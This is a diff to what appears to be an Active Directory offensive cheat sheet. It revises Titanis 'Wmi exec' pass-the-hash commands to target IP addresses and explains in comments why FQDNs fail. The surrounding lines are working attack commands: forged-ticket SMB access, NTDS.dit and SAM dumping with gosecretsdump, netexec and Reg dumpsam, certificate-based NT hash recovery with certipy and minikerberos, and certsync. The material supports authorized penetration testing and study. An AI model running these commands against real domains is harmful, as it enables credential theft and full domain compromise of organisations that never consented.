@@ -713,7 +713,8 @@ export KRB5CCNAME=Administrator.ccache
 smbclient.py -k -no-pass DOMAIN/Administrator@fileserver.domain.local
 
 # Titanis — non-functional with forged tickets; shown for API reference only
-# Wmi exec dc01.domain.local -UserName Administrator@DOMAIN \
+# (Titanis cannot load externally forged ccache; -TicketCache only works with Titanis-native ccache)
+# Wmi exec dc01 -ha 192.168.1.1 -UserName Administrator@DOMAIN \
 #   -TicketCache Administrator.ccache "whoami"
 # Smb2Client ls \\fileserver.domain.local\C$ -UserName Administrator@DOMAIN \
 #   -TicketCache Administrator.ccache
@@ -1457,8 +1458,8 @@ gosecretsdump -ntds ntds.dit -system SYSTEM -enabled   # enabled accounts only
 gosecretsdump -ntds ntds.dit -system SYSTEM -history   # include password history
 gosecretsdump -ntds ntds.dit -system SYSTEM -out hashes.txt
 
-# Titanis — PTH with recovered hash
-Wmi exec dc01.domain.local -UserName Administrator@DOMAIN \
+# Titanis — PTH with recovered hash (use IP; FQDNs fail at WMI DCOM activation)
+Wmi exec 192.168.1.1 -UserName Administrator@DOMAIN \
   -NtlmHash <recovered_ntlm> "whoami"
 ```
 
@@ -1508,8 +1509,8 @@ netexec smb 192.168.1.1 -u Administrator -p Password123 --ntds --user krbtgt
 # NetExec — pass-the-hash
 netexec smb 192.168.1.1 -u Administrator -H A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 --ntds
 
-# Titanis — PTH with recovered hash
-Wmi exec dc01.domain.local -UserName Administrator@DOMAIN \
+# Titanis — PTH with recovered hash (use IP; FQDNs fail at WMI DCOM activation)
+Wmi exec 192.168.1.1 -UserName Administrator@DOMAIN \
   -NtlmHash <recovered_ntlm> "whoami"
 ```
 
@@ -2198,11 +2199,11 @@ certipy auth -pfx admin.pfx -dc-ip 192.168.1.1 -domain DOMAIN.LOCAL
 minikerberos-getNTPKInit \
   "kerberos+pfx://DOMAIN\Administrator:@192.168.1.1?pfx=admin.pfx" admin_nt.txt
 
-# Step 4 — Titanis PTH with recovered hash
-Wmi exec dc01.domain.local -UserName Administrator@DOMAIN -NtlmHash <recovered_nt> "whoami"
+# Step 4 — Titanis PTH with recovered hash (use IP for Wmi exec; FQDNs fail at WMI DCOM activation)
+Wmi exec 192.168.1.1 -UserName Administrator@DOMAIN -NtlmHash <recovered_nt> "whoami"
 Smb2Client ls \\dc01.domain.local\C$ -UserName Administrator -UserDomain DOMAIN \
   -NtlmHash <recovered_nt>
-Reg dumpsam dc01.domain.local -UserName Administrator@DOMAIN -NtlmHash <recovered_nt> -BackupSemantics
+Reg dumpsam 192.168.1.1 -UserName Administrator@DOMAIN -NtlmHash <recovered_nt> -BackupSemantics
 ```
 
 [↑ Back to Index](#index)
@@ -2245,8 +2246,8 @@ certsync -u jdoe -p Password123 -d DOMAIN.LOCAL -dc-ip 192.168.1.1 \
 certsync -u jdoe -p Password123 -d DOMAIN.LOCAL -dc-ip 192.168.1.1 \
   -ns 192.168.1.1 -outputfile domain_hashes
 
-# Feed recovered hashes into Titanis PTH flows
-Wmi exec dc01.domain.local -UserName Administrator@DOMAIN \
+# Feed recovered hashes into Titanis PTH flows (use IP for Wmi exec; FQDNs fail at WMI DCOM activation)
+Wmi exec 192.168.1.1 -UserName Administrator@DOMAIN \
   -NtlmHash <recovered_nt> "whoami"
 Smb2Client ls \\dc01.domain.local\C$ -UserName Administrator@DOMAIN \
   -NtlmHash <recovered_nt>
